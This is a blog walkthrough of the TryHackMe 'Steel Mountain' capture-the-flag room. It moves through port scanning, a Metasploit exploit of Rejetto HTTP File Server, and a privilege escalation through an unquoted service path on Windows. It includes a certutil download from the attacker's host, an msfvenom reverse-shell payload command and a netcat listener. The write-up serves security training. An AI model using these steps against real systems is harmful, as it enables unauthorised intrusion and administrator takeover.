---
title: "Steel Mountain"
datePublished: Fri Aug 04 2023 01:48:21 GMT+0000 (Coordinated Universal Time)
cuid: clkvxfn7l000409mgdiuw5j7o
slug: steel-mountain
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1691592294728/4eea6687-9371-4086-b4cc-5e69c8fc588a.png
tags: ctf, 2articles1week, cybersecurity-1, tryhackme, ctf-writeup

---

This walkthrough will go over the [Steel Mountain](https://tryhackme.com/room/steelmountain) CTF found on [TryHackMe](https://tryhackme.com). This room is designed to test our Windows OS enumeration skills. We will use Metasploit to gain an initial foothold and then use PowerShell to enumerate the machine and escalate our privileges to Administrator.

### Step 1: Nmap

Note: ICMP is disabled, so we'll have to use the `-Pn` flag.

```bash
nmap -Pn -p- 10.10.0.5 -vvv
```

```plaintext
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 125
135/tcp   open  msrpc         syn-ack ttl 125
139/tcp   open  netbios-ssn   syn-ack ttl 125
445/tcp   open  microsoft-ds  syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125
5985/tcp  open  wsman         syn-ack ttl 125
8080/tcp  open  http-proxy    syn-ack ttl 125
47001/tcp open  winrm         syn-ack ttl 125
49152/tcp open  unknown       syn-ack ttl 125
49153/tcp open  unknown       syn-ack ttl 125
49154/tcp open  unknown       syn-ack ttl 125
49155/tcp open  unknown       syn-ack ttl 125
49156/tcp open  unknown       syn-ack ttl 125
49169/tcp open  unknown       syn-ack ttl 125
49170/tcp open  unknown       syn-ack ttl 125
```

From this scan, we can tell that there are two web servers, one of which will be our attack vector to get an initial foothold. Visiting the site on port 80 reveals nothing more than a static page for an employee of the month. Looking at the source code helps us identify a name, *Bill Harper*.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113410117/78e26866-6de1-4595-be30-97a365a1f41d.png align="center")

Moving on over to port 8080 proves to be a little more useful. Right off the bat, we can tell this is a user panel to an HTTP File Server.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113421551/bc9e5d0c-c6e1-4afa-b566-06f0457b7432.png align="center")

Looking at the source code helps us narrow it down to a `Rejetto HTTP File Server`. This is great news because this version is vulnerable to an RCE and Metasploit has a module for it called `rejetto_hfs_exec`.

### Step 2: Metasploit

From here we want to search for the `rejetto` module and configure the options.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113447324/e218eed9-4f8a-4eba-9d05-7524c6b5065a.png align="center")

After properly configuring the module and typing `exploit`, we get a meterpreter session and pop a shell to grab our first flag located in `C:\Users\bill\Deskto`p. Use `type user.txt` to view it from the command line.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113460353/562ce6d7-e56d-4eac-a48b-91d53837ca0b.jpeg align="center")

### Step 3: Privilege Escalation

To enumerate this machine, we will use `winPEAS`. You can download the latest version [here](https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe).

Start a Python server:

```bash
python3 -m http.server 8000
```

Upload `winPEAS` to the victims `C:\Users\bill\Desktop` directory using `certutil.exe`.

```bash
certutil.exe -urlcache -f http://10.13.28.215:8000/winPEASany_ofs.exe winPEASany_ofs.exe
```

Run it by typing `winPEASany_ofs.exe` .

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113544053/f7884b90-58a2-4667-8890-5edb05a79ea5.png align="center")

An interesting service called `AdvancedSystemCareService9` is missing quotes and has a space in between the application name, which means we can escape it and run a program called "`Advanced.exe`" with a reverse shell.

Let's fire up `msfvenom` and generate a payload.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe -o Advanced.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113567782/e5c99dee-d106-4144-97c9-93556990079a.png align="center")

Startup a Python server and transfer the payload over using `certutil`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113578290/4def3399-0d65-4e33-b741-97c14bfa9e6a.png align="center")

Move it to "`C:\Program Files (x86)\IObit\"`, and be sure to put the file path in quotes due to the space.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113586235/85a1fdb6-3607-409b-a1ec-f298d39db15e.png align="center")

Now we want to stop the `AdvancedSystemCareService9` service.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113596097/f50abfb1-56d2-4a7e-9f8d-4c63d9d49cfa.png align="center")

Start a netcat listener to catch the reverse shell.

```bash
nc -lvnp 1337
```

Start the `AdvancedSystemCareService9` service back up.

### Step 4: Root

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113623575/0623872a-2d25-4ac6-9184-30c48c6e7d1a.png align="center")

Pwned! From here we can grab the last flag found in `C:\Users\Administrator\Desktop`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691113632364/117dcb66-121f-481e-88b2-32df16cf5710.jpeg align="center")

I hope you enjoyed this walkthrough of the [Steel Mountain](https://tryhackme.com/room/steelmountain) CTF found on [TryHackMe](https://tryhackme.com). Happy Hacking.